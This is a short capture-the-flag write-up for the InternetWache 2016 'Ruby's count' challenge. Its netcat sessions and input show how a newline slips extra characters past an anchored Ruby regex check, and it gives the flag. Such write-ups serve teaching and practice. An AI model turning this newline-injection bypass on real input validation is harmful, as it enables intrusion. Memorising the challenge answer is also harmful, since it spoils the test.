+++
author = "kbeckmann"
categories = [ "writeups" ]
date = "2016-02-20T23:56:46+01:00"
title = "InternetWache 2016 Ruby's count (Exploit 50) Writeup"

+++

# Problem

> Description: Hi, my name is Ruby. I like converting characters into ascii values and then calculating the sum.

(exp50, solved by 217)

Service: 188.166.133.53:12037

# Solution

We have to send characters where the sum adds upp to over 1020.

~~~
$ nc 188.166.133.53 12037
Let me count the ascii values of 10 characters:
ffffffffff
Sum is: 1020
That's not enough (1020 < 1020) :(
~~~

~~~
$ nc 188.166.133.53 12037
Let me count the ascii values of 10 characters:
qqqqqqqqqq        
WRONG!!!! Only 10 characters matching /^[a-f]{10}$/ !
~~~

So we need to trick the regex somehow. Turns out that we can add a new line and solve it that way.

~~~
$ echo "ffffffffff\nf" | nc 188.166.133.53 12037
Let me count the ascii values of 10 characters:
Sum is: 1132
IW{RUBY_R3G3X_F41L}
~~~

Flag is **IW{RUBY_R3G3X_F41L}**
